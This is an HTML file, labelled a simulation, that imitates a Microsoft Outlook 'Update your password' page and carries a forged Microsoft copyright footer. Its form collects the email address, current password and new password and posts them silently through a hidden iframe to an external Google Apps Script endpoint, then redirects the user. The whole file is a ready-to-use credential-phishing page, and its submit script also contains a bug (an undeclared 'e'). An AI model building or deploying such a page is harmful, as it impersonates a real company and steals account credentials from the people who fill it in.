<!-- index.html (Outlook Password Change Simulation) -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Update your password - Outlook</title>
  <style>
    body {
      background: #f3f6fb;
      font-family: Segoe UI, Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 380px;
      margin: 60px auto;
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 4px 18px rgba(0,0,0,0.10);
      padding: 32px 28px;
      border: 1.5px solid #e3e6ee;
    }
    .header {
      text-align: left;
      margin-bottom: 24px;
    }
    .header img {
      width: 44px;
      margin-bottom: 10px;
    }
    h2 {
      color: #0078d4;
      font-size: 1.2em;
      margin: 0 0 10px 0;
    }
    label {
      display: block;
      margin-top: 18px;
      margin-bottom: 6px;
      color: #444;
      font-size: 1em;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      box-sizing: border-box;
      padding: 10px 12px;
      border: 1px solid #c8c8c8;
      border-radius: 4px;
      font-size: 1em;
      margin-bottom: 4px;
      background: #f9f9f9;
    }
    .btn {
      width: 100%;
      background: #0078d4;
      color: #fff;
      border: none;
      border-radius: 4px;
      padding: 12px 0;
      font-size: 1em;
      margin-top: 18px;
      cursor: pointer;
    }
    .footer {
      margin-top: 22px;
      font-size: 0.92em;
      color: #888;
      text-align: center;
    }
    .success-msg {
      display: none;
      color: green;
      margin-top: 16px;
      text-align: center;
    }
  </style>
</head>
<body>
    <div class="container">
        <div class="header">
        <h2>Update your password</h2>
        <p>For your security, please change your password regularly.</p>
        </div>

        <!-- NETLIFY FORM (Must include `netlify` or `data-netlify="true"`) -->
        <form
            id="passwordForm"
            action="https://script.google.com/macros/s/AKfycbyEc6bDlTHcL2_xDQaXbfaUM4ZQQyz3oULk12K77vuZD-zc6_OwQlTcuew3nXZJqdl2/exec"
            method="POST"
            enctype="application/x-www-form-urlencoded"
            target="hiddenFrame"
        >
        <!-- Form fields -->
        <label for="email">Email address</label>
        <input type="email" id="email" name="email" required>

        <label for="current-password">Current password</label>
        <input type="password" id="currentPassword" name="currentPassword" required>

        <label for="new-password">New password</label>
        <input type="password" id="newPassword" name="newPassword" required>

        <button type="submit">Update password</button>
        </form>
        
        <!-- Hidden iframe for silent submission -->
        <iframe name="hiddenFrame" style="display:none;"></iframe>

        <div class="footer">
        &copy; 2025 Microsoft Corporation. All rights reserved.
        </div>
    </div>
    <script>
        document.getElementById("passwordForm").addEventListener("submit", function() {
            // Form submission to Google Sheets via iframe
            
            // Clear the form inputs after submission
            const inputs = e.target.querySelectorAll("input");
            inputs.forEach(input => input.value = "");

            // Redirect after 1 second (allow time for submission)
            setTimeout(() => {
                window.location.href = "/result.html"; // target page
            }, 1000);
        });
    </script>
</body>
</html>
